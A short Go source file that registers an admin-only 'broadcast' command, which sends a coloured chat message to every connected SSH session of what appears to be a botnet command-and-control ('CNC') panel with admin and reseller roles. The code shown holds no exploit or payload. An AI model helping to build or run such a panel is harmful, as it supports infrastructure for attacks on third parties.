package commands

import (
	"Yami/core/clients/session"
	"strings"

	"golang.org/x/crypto/ssh"
)

func init() {
	Register(&Command{
		Name: "broadcast",
		Admin: true,
		Reseller: false,

		Descriptions: "broadcast a message across all clients!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {

			if len(cmd) < 2 {
				channel.Write([]byte("Syntax Must Equal: broadcast <message>\r\n"))
				channel.Write([]byte("Syntax Example : broadcast Icey CNC \r\n"))
				return nil
			}

			message := strings.Join(cmd, " ")

			message = strings.Replace(message, "broadcast", "", -1)




			Sessions.Broadcast([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K"+sshConn.User()+"\x1b[38;5;1m>\x1b[38;5;15m"+message+"\x1b[0m\x1b8"))

			return nil
		},
	})
}